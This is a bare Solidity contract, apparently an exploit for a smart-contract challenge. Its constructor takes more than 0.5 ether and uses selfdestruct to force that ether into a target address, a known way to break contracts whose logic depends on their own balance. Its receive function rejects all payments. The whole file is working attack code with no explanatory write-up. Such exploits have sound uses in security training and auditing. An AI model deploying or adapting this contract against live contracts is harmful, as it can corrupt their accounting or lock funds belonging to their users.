// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract HackerVIPContract {

    constructor(address _target) payable {
        require(msg.value>0.5 ether,"More than that");
        selfdestruct(payable(_target));
    }

    receive() external payable {
        revert("Nope");
    }

}   